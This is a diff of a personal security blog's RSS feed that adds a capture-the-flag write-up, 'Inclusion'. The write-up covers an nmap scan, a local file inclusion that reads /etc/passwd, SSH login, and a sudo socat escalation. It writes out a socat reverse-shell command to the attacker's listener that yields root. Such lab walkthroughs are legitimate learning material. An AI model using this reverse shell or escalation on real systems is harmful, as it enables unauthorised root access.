@@ -1,4 +1,77 @@
-<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.12</generator><lastBuildDate>Fri, 10 Apr 2020 17:31:33 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>CTFcollectionVol2 | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's&lt;/p&gt;</description><link>http://localhost:2368/ctfcollectionvol2-write-up/</link><guid isPermaLink="false">5e8f196e5e61514e230adc53</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 09 Apr 2020 13:28:55 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/holida-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/holida-1.png" alt="CTFcollectionVol2 | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's start with some recon.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.194.62
+<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:media="http://search.yahoo.com/mrss/" version="2.0"><channel><title>fr33s0ul</title><description>Cybersecurity, Technology, and CTFs</description><link>http://localhost:2368/</link><image><url>http://localhost:2368/favicon.png</url><title>fr33s0ul</title><link>http://localhost:2368/</link></image><generator>Ghost 3.12</generator><lastBuildDate>Fri, 10 Apr 2020 21:29:09 GMT</lastBuildDate><atom:link href="http://localhost:2368/rss/" rel="self" type="application/rss+xml"/><ttl>60</ttl><item><title>Inclusion | CTF write-up</title><description>&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
+Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.&lt;/code&gt;&lt;/pre&gt;</description><link>http://localhost:2368/inclusion-ctf-write-up/</link><guid isPermaLink="false">5e9086505e61514e230adcb9</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Fri, 10 Apr 2020 14:45:16 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/cdsczxcasdasdqw.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/cdsczxcasdasdqw.png" alt="Inclusion | CTF write-up"&gt;&lt;p&gt;today's CTF is really easy, and really recommend it for beginners to CTFs, let's go straight to it&lt;/p&gt;&lt;p&gt;&lt;strong&gt;ENUMERATION!&lt;/strong&gt;&lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/Za2fXikif3b9e" width="451" height="480" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/hell-yeah-Za2fXikif3b9e"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.94.6
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 14:38 UTC
+Nmap scan report for ip-10-10-94-6.eu-west-1.compute.internal (10.10.94.6)
+Host is up (0.0014s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
+|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
+|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
+80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
+|_http-title: My blog
+MAC Address: 02:13:CE:65:8B:84 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
+root@kali:~#&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have two ports open 22 for SSH and 80 for HTTP running under python, which I think running django ... anyways! &lt;/p&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-16.00.48.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;figcaption&gt;ow look at that LFI-attack!&lt;/figcaption&gt;&lt;/figure&gt;&lt;figure class="kg-card kg-image-card kg-card-hascaption"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-15.40.22.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;figcaption&gt;ok&lt;/figcaption&gt;&lt;/figure&gt;&lt;p&gt;and we have the /etc/passwd and a clear password for our user down there ...&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# ssh falconfeast@10.10.94.6
+The authenticity of host '10.10.94.6 (10.10.94.6)' can't be established.
+ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.94.6' (ECDSA) to the list of known hosts.
+falconfeast@10.10.94.6's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Apr 10 20:13:54 IST 2020
+
+  System load:  0.42              Processes:           87
+  Usage of /:   34.9% of 9.78GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.94.6
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+3 packages can be updated.
+3 updates are security updates.
+
+
+Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
+falconfeast@inclusion:~$ sudo -l
+Matching Defaults entries for falconfeast on inclusion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falconfeast may run the following commands on inclusion:
+    (root) NOPASSWD: /usr/bin/socat
+falconfeast@inclusion:~$&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;we are user falconfeast ! and we have a NOPASSWD SUDO FOR SOCAT .... speaking of socat, there's a PoC in &lt;strong&gt;GTFObins&lt;/strong&gt;, I really recommend checking the website it does have a lot of good knowledge.&lt;/p&gt;&lt;figure class="kg-card kg-image-card"&gt;&lt;img src="http://localhost:2368/content/images/2020/04/Screenshot-2020-04-10-at-15.46.56.png" class="kg-image" alt="Inclusion | CTF write-up"&gt;&lt;/figure&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;falconfeast@inclusion:~$ sudo -l
+Matching Defaults entries for falconfeast on inclusion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User falconfeast may run the following commands on inclusion:
+    (root) NOPASSWD: /usr/bin/socat
+falconfeast@inclusion:~$ RHOST=10.10.95.247
+falconfeast@inclusion:~$ RPORT=5151
+falconfeast@inclusion:~$ sudo /usr/bin/socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane
+
+&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# socat file:`tty`,raw,echo=0 tcp-listen:5151
+sh: 0: can't access tty; job control turned off                                     
+# id                                                                                
+uid=0(root) gid=0(root) groups=0(root)
+# 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and that's it here you are, go get your flags! &lt;/p&gt;&lt;!--kg-card-begin: html--&gt;&lt;iframe src="https://giphy.com/embed/qyIKyAdelGPYI" width="480" height="305" frameborder="0" class="giphy-embed" allowfullscreen&gt;&lt;/iframe&gt;&lt;p&gt;&lt;a href="https://giphy.com/gifs/this-is-our-youth-qyIKyAdelGPYI"&gt;&lt;/a&gt;&lt;/p&gt;&lt;!--kg-card-end: html--&gt;&lt;p&gt;Happy Hacking!&lt;/p&gt;</content:encoded></item><item><title>CTFcollectionVol2 | write-up</title><description>&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's&lt;/p&gt;</description><link>http://localhost:2368/ctfcollectionvol2-write-up/</link><guid isPermaLink="false">5e8f196e5e61514e230adc53</guid><dc:creator>fr33s0ul</dc:creator><pubDate>Thu, 09 Apr 2020 13:28:55 GMT</pubDate><media:content url="http://localhost:2368/content/images/2020/04/holida-1.png" medium="image"/><content:encoded>&lt;img src="http://localhost:2368/content/images/2020/04/holida-1.png" alt="CTFcollectionVol2 | write-up"&gt;&lt;p&gt;Hello everyone, today's CTF is the second part of a first one, it doesn't mean you need to do the first one to pass to the second.&lt;br&gt;this CTF is rated as a medium when it comes to difficulty, but trust me it doesn't matter. less talking more doing ... let's start with some recon.&lt;/p&gt;&lt;pre&gt;&lt;code&gt;root@kali:~# nmap -sC -sV 10.10.194.62
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-09 12:45 UTC
 Nmap scan report for ip-10-10-194-62.eu-west-1.compute.internal (10.10.194.62)
 Host is up (0.00091s latency).
